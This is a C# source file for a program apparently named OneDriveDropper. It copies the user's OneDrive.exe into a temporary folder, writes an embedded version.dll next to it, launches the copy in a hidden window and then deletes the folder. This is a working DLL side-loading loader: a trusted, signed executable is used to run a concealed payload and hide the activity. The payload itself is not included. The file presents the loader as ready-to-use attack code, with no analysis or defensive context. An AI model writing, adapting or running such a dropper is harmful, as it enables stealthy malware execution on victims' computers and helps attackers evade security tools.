using System;
using System.IO;
using System.Reflection;

class Program
{
    static void Main()
    {
        string oneDrive = FindOneDrive();
        if (oneDrive == null) return;

        string temp = Path.Combine(Path.GetTempPath(), "OD_" + Guid.NewGuid().ToString("N")[..8]);
        Directory.CreateDirectory(temp);

        string exe = Path.Combine(temp, "OneDrive.exe");
        string dll = Path.Combine(temp, "version.dll");

        File.Copy(oneDrive, exe, true);

        // Extract embedded version.dll 
        var asm = Assembly.GetExecutingAssembly();
        var stream = asm.GetManifestResourceStream("OneDriveDropper.version.dll");
        using (var fs = new FileStream(dll, FileMode.Create))
            stream.CopyTo(fs);

        // Launch
        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
        {
            FileName = exe,
            WorkingDirectory = temp,
            UseShellExecute = true,
            WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
            CreateNoWindow = true
        });

        
        System.Threading.Thread.Sleep(10000);
        try { Directory.Delete(temp, true); } catch { }
    }

    static string FindOneDrive()
    {
        string[] paths = {
            Environment.ExpandEnvironmentVariables(@"%LOCALAPPDATA%\Microsoft\OneDrive\OneDrive.exe"),
            @"C:\Program Files\Microsoft OneDrive\OneDrive.exe",
            @"C:\Program Files (x86)\Microsoft OneDrive\OneDrive.exe"
        };
        foreach (var p in paths)
            if (File.Exists(p)) return p;
        return null;
    }
}
